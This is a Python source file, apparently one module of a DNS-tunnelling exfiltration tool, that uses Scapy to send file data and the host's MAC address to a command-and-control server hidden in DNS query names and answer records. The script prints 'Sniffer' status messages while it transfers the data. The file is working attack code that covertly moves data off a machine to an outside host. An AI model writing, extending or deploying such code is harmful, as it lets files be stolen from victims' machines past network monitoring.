# external imports
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp

# internal imports
from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
from utils.request_type import RequestType
from utils.mac import get_mac

class DataRequest:
    """ A data request sends actual file data via the subdomains in an A record. """

    def __init__(self, _type, packet_number, filename, data):
        self.type = _type
        self.packet_number = packet_number
        self.filename = filename
        self.data = data
    
    def build(self): 
        reformatted_filename = "." + self.filename + ("." if self.filename.find('.') == -1 else "") 

        ether = Ether()
        ip = IP(dst=CC_SERVER_IP)
        udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
        dns = DNS(
            qr=PACKET_OPTIONS['DNS']['QR'], # it is a query, not a response
            opcode=self.type,
            qdcount=PACKET_OPTIONS['DNS']['QDCOUNT'],
            ancount=PACKET_OPTIONS['DNS']['ANCOUNT'],
            qd=DNSQR(qname=get_mac() + '.' + CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
            an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST + reformatted_filename, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=self.data)
        )

        return ether/ip/udp/dns
    
    def send(self):
        if self.type == 0:
            print("[Sniffer] Beginning data transfer...")

        elif self.type == 2:
            print("[Sniffer] File transfer completed.")

        else:
            print("[Sniffer] Sending Data:\n\t {}".format(self.data))

        sendp(x=self.build(), iface=INTERFACE, verbose=0)